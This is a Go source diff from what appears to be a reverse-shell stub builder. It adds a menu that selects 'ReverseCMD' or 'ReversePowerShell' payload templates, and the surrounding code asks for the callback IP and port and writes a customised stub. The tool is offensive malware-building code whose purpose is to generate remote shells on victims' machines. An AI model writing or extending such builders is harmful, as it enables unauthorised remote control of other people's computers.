@@ -140,6 +140,23 @@ func handleCommands() {
 }
 
 func CreateStub() {
+	// User input for payload selection
+	var payloadChoice string
+	fmt.Print("Select payload type (1: ReverseCMD, 2: ReversePowerShell): ")
+	fmt.Scanln(&payloadChoice)
+
+	// Set payload path based on user choice
+	var payloadPath string
+	switch payloadChoice {
+	case "1":
+		payloadPath = filepath.Join("Dependencies", "payload1.go")
+	case "2":
+		payloadPath = filepath.Join("Dependencies", "payload2.go")
+	default:
+		fmt.Println("Invalid selection. Choose 1 for ReverseCMD or 2 for ReversePowerShell.")
+		return
+	}
+
 	// User input for IP, port, file name, and output directory
 	var ip, port, fileName, outputDir string
 	fmt.Print("Enter IP for client to connect to: ")
@@ -156,11 +173,7 @@ func CreateStub() {
 		outputDir = "."
 	}
 
-	// Define paths
-	currentDir, _ := os.Getwd()
-	payloadPath := filepath.Join(currentDir, "Dependencies", "payload1.go")
-
-	// Read and modify the payload file
+	// Read and modify the selected payload file
 	payloadContent, err := os.ReadFile(payloadPath)
 	if err != nil {
 		fmt.Println("Error reading payload file:", err)
